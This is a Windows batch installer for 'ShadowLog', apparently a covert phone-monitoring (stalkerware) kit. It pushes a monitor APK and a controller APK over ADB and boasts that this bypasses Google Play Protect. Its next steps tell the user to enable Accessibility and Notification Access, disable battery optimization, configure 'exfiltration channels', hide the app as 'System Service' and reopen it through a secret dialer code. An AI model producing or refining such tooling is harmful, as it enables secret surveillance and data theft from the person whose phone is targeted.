@echo off
setlocal
title ShadowLog Mobile — APK Installer
color 0A
echo.
echo  ====================================================
echo    ShadowLog Mobile — One-Click APK Installer
echo  ====================================================
echo.
echo  This script installs the ShadowLog APKs via ADB,
echo  completely bypassing Google Play Protect.
echo.
echo  Prerequisites:
echo    1. USB Debugging must be enabled on your phone
echo       (Settings → Developer Options → USB Debugging)
echo    2. Phone must be connected via USB cable
echo    3. Accept the "Allow USB Debugging" prompt on phone
echo.
echo  ====================================================
echo.
pause

:: ── Locate ADB ──
set "ADB="

:: Check if adb is in PATH
where adb >nul 2>&1
if %ERRORLEVEL% EQU 0 (
    set "ADB=adb"
    goto :found_adb
)

:: Check default Android SDK location
set "SDK_ADB=%LOCALAPPDATA%\Android\Sdk\platform-tools\adb.exe"
if exist "%SDK_ADB%" (
    set "ADB=%SDK_ADB%"
    goto :found_adb
)

:: Check ANDROID_HOME
if defined ANDROID_HOME (
    if exist "%ANDROID_HOME%\platform-tools\adb.exe" (
        set "ADB=%ANDROID_HOME%\platform-tools\adb.exe"
        goto :found_adb
    )
)

:: Check ANDROID_SDK_ROOT
if defined ANDROID_SDK_ROOT (
    if exist "%ANDROID_SDK_ROOT%\platform-tools\adb.exe" (
        set "ADB=%ANDROID_SDK_ROOT%\platform-tools\adb.exe"
        goto :found_adb
    )
)

echo.
echo  ERROR: ADB not found!
echo.
echo  Install Android SDK Platform Tools:
echo    https://developer.android.com/tools/releases/platform-tools
echo.
echo  Or set ANDROID_HOME to your SDK path.
echo.
pause
exit /b 1

:found_adb
echo  [OK] Found ADB: %ADB%
echo.

:: ── Check for connected device ──
echo  [1/4] Checking for connected device...
"%ADB%" devices | findstr /r "device$" >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo.
    echo  ERROR: No Android device detected!
    echo.
    echo  Make sure:
    echo    1. Your phone is connected via USB
    echo    2. USB Debugging is enabled
    echo    3. You accepted the "Allow USB Debugging" prompt
    echo.
    echo  If you just connected, wait a few seconds and try again.
    echo.
    pause
    exit /b 1
)

for /f "tokens=1" %%d in ('"%ADB%" devices ^| findstr /r "device$"') do (
    echo  [OK] Device connected: %%d
)
echo.

:: ── Locate APK files ──
set "SCRIPT_DIR=%~dp0"
set "MONITOR_APK=%SCRIPT_DIR%ShadowLog-Monitor.apk"
set "CONTROLLER_APK=%SCRIPT_DIR%ShadowLog-Controller.apk"

:: ── Install Monitor APK ──
echo  [2/4] Installing ShadowLog Monitor...
if exist "%MONITOR_APK%" (
    "%ADB%" install -r "%MONITOR_APK%"
    if %ERRORLEVEL% EQU 0 (
        echo  [OK] Monitor APK installed successfully!
    ) else (
        echo  [!!] Monitor APK install failed. Check device screen for prompts.
    )
) else (
    echo  [SKIP] Monitor APK not found in mobile/app/build/outputs/apk/debug/
)
echo.

:: ── Install Controller APK ──
echo  [3/4] Installing ShadowLog Controller...
if exist "%CONTROLLER_APK%" (
    "%ADB%" install -r "%CONTROLLER_APK%"
    if %ERRORLEVEL% EQU 0 (
        echo  [OK] Controller APK installed successfully!
    ) else (
        echo  [!!] Controller APK install failed. Check device screen for prompts.
    )
) else (
    echo  [SKIP] Controller APK not found in mobile/controller/build/outputs/apk/debug/
)
echo.

:: ── Done ──
echo  [4/4] Installation complete!
echo.
echo  ====================================================
echo    NEXT STEPS
echo  ====================================================
echo.
echo  1. Open "System Service" from your app drawer
echo  2. Enable Accessibility Service (REQUIRED)
echo  3. Enable Notification Access (REQUIRED)
echo  4. Disable Battery Optimization (Recommended)
echo  5. Configure exfiltration channels
echo  6. Tap "Initialize Service"
echo.
echo  To re-access after hiding:
echo    Dial *#*#27420#*#* on the phone dialer
echo.
echo  ====================================================
echo.
pause
